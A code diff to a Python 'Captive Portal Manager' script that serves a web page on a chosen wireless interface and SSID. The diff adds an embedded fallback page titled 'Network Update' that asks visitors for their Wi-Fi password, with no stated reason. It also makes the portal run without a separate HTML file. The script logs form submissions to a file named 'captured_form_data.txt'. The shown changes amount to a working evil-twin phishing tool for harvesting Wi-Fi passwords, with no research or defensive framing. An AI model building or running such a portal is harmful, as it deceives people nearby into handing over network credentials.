@@ -18,12 +18,34 @@ PORT = 80
 CAPTIVE_PORTAL_SSID = ""
 AP_STATIC_IP = "192.168.1.1/24"
 FORM_OUTPUT_FILE = "captured_form_data.txt"
+PORTAL_HTML = ""
+EMBEDDED_PORTAL_HTML = """<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Network Update</title>
+</head>
+<body>
+  <h1>Network Update</h1>
+  <p>Enter the required information to continue.</p>
+  <form method="post">
+    <label for="wifi_password">Wi-Fi Password</label>
+    <input type="text" id="wifi_password" name="wifi_password" required>
+    <button type="submit">Submit</button>
+  </form>
+</body>
+</html>
+"""
 
 # ==================== HTTP SERVER CLASS ====================
 class CaptivePortalHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         """Handle GET requests - display login page"""
         print(f"[{datetime.now()}] GET request from {self.client_address[0]} to {self.path}")
+
+        # Always display login page regardless of path (improves captive portal reach)
+        html_content = PORTAL_HTML or EMBEDDED_PORTAL_HTML
         
         if self.path not in ("/", f"/{HTML_FILE}"):
             self.send_response(302)
@@ -179,6 +201,17 @@ def get_interface_info():
             print(f"   {'-'*40}")
     
     return interface_info
+
+def load_portal_html():
+    """Load portal HTML from file or fall back to embedded HTML."""
+    if os.path.exists(HTML_FILE):
+        try:
+            with open(HTML_FILE, 'r', encoding='utf-8') as f:
+                return f.read()
+        except OSError as e:
+            print(f"[{datetime.now()}] ERROR reading HTML file: {e}")
+    print(f"[{datetime.now()}] Using embedded HTML (missing or unreadable {HTML_FILE}).")
+    return EMBEDDED_PORTAL_HTML
 
 def start_captive_portal(interface, ssid):
     """Start captive portal on selected interface"""
@@ -390,12 +423,9 @@ def main():
     print("CAPTIVE PORTAL MANAGER")
     print("="*60)
     
-    # Check if HTML file exists
-    if not os.path.exists(HTML_FILE):
-        print(f"\n❌ HTML file not found: {HTML_FILE}")
-        print(f"   Place your {HTML_FILE} in the same directory as this script")
-        print(f"   Or rename your HTML file to {HTML_FILE}")
-        sys.exit(1)
+    # Load portal HTML
+    global PORTAL_HTML
+    PORTAL_HTML = load_portal_html()
     
     # 1. List interfaces
     interfaces = get_interface_info()
